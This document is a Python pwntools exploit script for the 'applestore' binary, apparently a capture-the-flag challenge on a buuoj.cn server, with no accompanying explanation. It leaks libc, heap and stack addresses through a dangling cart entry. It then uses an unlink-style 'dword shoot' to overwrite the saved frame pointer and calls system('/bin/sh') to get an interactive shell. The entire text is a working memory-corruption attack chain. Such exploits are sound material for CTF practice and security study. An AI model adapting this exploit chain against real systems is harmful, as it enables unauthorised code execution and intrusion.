from pwn import *
debug = 0
elf = ELF('./applestore')
if debug:
    p = process('./applestore')
    libc = ELF('./libc.local.so')
    #off = 0x001b2000
    context.log_level = 'debug'
    # gdb.attach(p)
else:
    p = remote('node4.buuoj.cn',28802)
    libc = ELF('../../i386libc/x86_libc.so.6')
    #off = 0x001b0000

for i in range(6):
	p.recvuntil(">")
	p.sendline('2')
	p.recvuntil("Device Number>")
	p.sendline('1')
for i in range(20):
	p.recvuntil(">")
	p.sendline('2')
	p.recvuntil("Device Number>")
	p.sendline('2')

p.recvuntil('>')
p.sendline('5')
p.recvuntil('Let me check your cart. ok? (y/n) >')
p.sendline('y')

if 'iPhone 8' in p.recvuntil('>'):
	log.success('got iPhone 8')




#leaklibc
num = 'y\0'
read_got = elf.got['read']
price = 0
next_phone = 0
last_phone = 0xdeadbeef
leak = 'y'
leak = flat(num,read_got,price,next_phone,last_phone)
print len(leak),' : ', leak
p.sendline('4')
p.recvuntil('Let me check your cart. ok? (y/n) >')
p.sendline(leak)
p.recvuntil('27: ')

read_libc_addr = u32(p.recv(4))
if read_libc_addr > 0xf7000000:
	log.success('got read addr:'+hex(read_libc_addr))
system_libc = libc.symbols['system']
bin_sh_libc = next(libc.search('/bin/sh'))
read_libc   = libc.symbols['read']

system_libc_addr = system_libc + read_libc_addr - read_libc
bin_sh_libc_addr = bin_sh_libc + read_libc_addr - read_libc
#leakheap
#gdb.attach(p,'b *0x8048b03')
p.recvuntil('>')
num = 'y\0'
read_got = 0x804b070
price = 0
next_phone = 0
last_phone = 0xdeadbeef
leak = 'y'
leak = flat(num,read_got,price,next_phone,last_phone)
print len(leak),' : ', leak
p.sendline('4')
p.recvuntil('Let me check your cart. ok? (y/n) >')
p.sendline(leak)
p.recvuntil('27: ')
heap_addr = u32(p.recv(4))
print '[+]heap: ',hex(heap_addr)
#leak_stack
stack_p = log.progress('pass')
for i in range(26):
	p.recvuntil('>')
	num = 'y\0'
	read_got = heap_addr+8
	price = 0
	next_phone = 0
	last_phone = 0xdeadbeef
	leak = 'y'
	leak = flat(num,read_got,price,next_phone,last_phone)
	print len(leak),' : ', leak
	p.sendline('4')
	p.recvuntil('Let me check your cart. ok? (y/n) >')
	p.sendline(leak)
	p.recvuntil('27: ')
	heap_addr = u32(p.recv(4))
	print '[+]stack: ',hex(heap_addr)
	stack_p.status('stack' + hex(heap_addr))


stack_addr = heap_addr
p.success('find stack addr:'+hex(stack_addr))
#dword shoot
ebp_addr = stack_addr + 0x20 + 0x40

num = '27'

dword_shoot_exp = flat(num,0,0,stack_addr+64,ebp_addr-8)
print len(dword_shoot_exp),":",dword_shoot_exp
p.recvuntil('>')
p.sendline('3')
p.recvuntil('Number>')
#gdb.attach(p)
p.sendline(dword_shoot_exp)
'''
#put system into stack

p.recvuntil('>')

'''
#exit


num = '6\0'
esp = 0xdeadbeef
exp = flat(num,esp,system_libc_addr,esp,bin_sh_libc_addr)


p.recvuntil('>')
p.sendline(exp)



p.interactive()